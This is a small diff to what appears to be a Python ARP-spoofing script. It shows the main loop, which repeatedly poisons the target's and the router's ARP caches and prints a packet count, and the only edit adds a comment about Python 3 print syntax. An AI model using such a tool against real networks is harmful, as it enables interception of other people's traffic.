@@ -25,6 +25,7 @@ while True:
 	spoof(target_interface_1, router_ip)
 	spoof(router_ip, target_interface_1)
 	sent_packets_count = sent_packets_count + 2
+	# For Python3 add end="" to the end of the print statement, remove comma
 	print("\r[+] Packets sent: " + str(sent_packets_count)),
 	sys.stdout.flush()
 	time.sleep(2)
